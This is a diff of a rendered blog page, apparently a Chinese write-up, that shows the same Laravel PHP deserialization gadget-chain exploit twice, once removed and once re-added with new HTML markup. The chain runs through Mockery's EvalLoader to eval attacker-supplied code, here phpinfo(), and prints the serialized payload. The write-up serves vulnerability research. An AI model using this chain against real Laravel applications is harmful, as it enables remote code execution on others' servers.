 &lt;p>第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
 &lt;p>总结以上的过程，写exp&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
 &lt;p>这个链子非常的长，涉及到6个类&lt;/p>
 &lt;hr>
